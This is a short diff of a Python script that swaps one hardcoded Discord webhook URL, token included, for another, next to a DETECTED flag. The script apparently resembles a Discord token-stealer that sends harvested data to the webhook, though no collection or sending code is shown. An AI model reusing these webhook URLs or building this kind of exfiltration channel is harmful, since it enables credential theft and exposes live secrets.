@@ -16,7 +16,7 @@ import re
 import subprocess
 
 
-hook = "https://discordapp.com/api/webhooks/1036796438434291762/pb0-Qc-bsNgGDA29Ojy2IOXHRuZ1M1W5xeXAHmkSguzP966g-EDgaqPcm57uq0f74wEJ"
+hook = "https://discordapp.com/api/webhooks/1036855487171395634/ra-nX98x2ZFn7ZWKHsHvW9k7wIpg8Mobvm6hUhLvKhpLvNw4NtW2cBtkCe00iwanVjQg"
 DETECTED = False
 
 
